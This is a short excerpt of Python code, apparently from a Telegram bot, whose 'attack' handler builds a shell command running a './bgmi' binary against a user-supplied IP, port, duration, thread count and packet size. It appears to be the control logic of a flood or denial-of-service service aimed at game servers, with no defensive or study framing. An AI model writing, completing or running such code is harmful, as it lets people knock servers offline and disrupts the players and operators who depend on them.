...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./bgmi {ip} {port} {duration} 900"
    elif argument_type == 4:
        attack_command = f"./bgmi {ip} {port} {duration} {threads} 900"
    elif argument_type == 5:
        attack_command = f"./bgmi {ip} {port} {duration} {byte_size} {threads} 900"
